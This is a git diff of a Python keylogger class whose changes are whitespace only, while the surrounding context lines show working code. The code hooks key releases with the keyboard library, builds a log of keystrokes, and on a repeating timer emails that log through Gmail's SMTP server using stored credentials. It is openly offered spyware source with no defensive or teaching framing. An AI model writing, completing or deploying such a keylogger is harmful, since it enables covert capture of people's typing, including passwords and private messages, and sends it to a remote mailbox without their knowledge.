@@ -29,6 +29,7 @@ class Keylogger:
                 key = f'[{key.upper()}]'
 
         self.log += key
+        
     #sends email
     def sendmail(self, email, password, message):
         server = smtplib.SMTP(host='smtp.gmail.com', port=587)
@@ -36,17 +37,18 @@ class Keylogger:
         server.login(email, password)
         server.sendmail(email, email, message)
         server.quit()
+        
     #calls sendmail after every interval of time
     def report(self):
         if self.log:
             self.sendmail(EMAIL, PASSWORD, self.log)
         self.log = ''
         Timer(interval=self.interval, function=self.report).start()
+        
     #called when the object is created
     def start(self):
         keyboard.on_release(callback=self.callback)
         self.report()
-
 
 if __name__ == '__main__':
     kelogger = Keylogger(interval=INTERVAL)
